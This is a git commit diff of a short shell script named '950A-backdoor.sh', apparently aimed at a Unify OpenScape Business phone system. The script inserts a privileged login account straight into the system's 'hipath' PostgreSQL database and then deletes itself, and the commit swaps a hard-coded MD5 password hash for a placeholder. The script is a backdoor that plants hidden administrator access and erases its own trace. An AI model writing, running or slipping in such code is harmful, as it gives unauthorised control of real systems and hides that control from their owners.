28567382b677fadbcc7a5ef16cb29c2b38476b47
braam <44501894+braam@users.noreply.github.com>
2021-04-20 12:35:57 +0200

    Update 950A-backdoor.sh

--- Backdoor_OSBiz/950A-backdoor.sh
+++ Backdoor_OSBiz/950A-backdoor.sh
@@ -1,7 +1,7 @@
 #!/bin/sh
 #Password is forced to enter new on first login. User placed on index 9 in database.
 
-psql  -U postgres -t -A -d hipath -c "INSERT INTO as_login_data (login_user_id, login_user_role, login_user_name, login_user_passwd) VALUES(9,4,'bkm_unify@system','45e32f69ceb52b8a179cdd274cbbaaf1');" >/dev/null
+psql  -U postgres -t -A -d hipath -c "INSERT INTO as_login_data (login_user_id, login_user_role, login_user_name, login_user_passwd) VALUES(9,4,'bkm_unify@system','<md5-hash-here>');" >/dev/null
 
 rm -- "$0" #self destruct
 exit 0
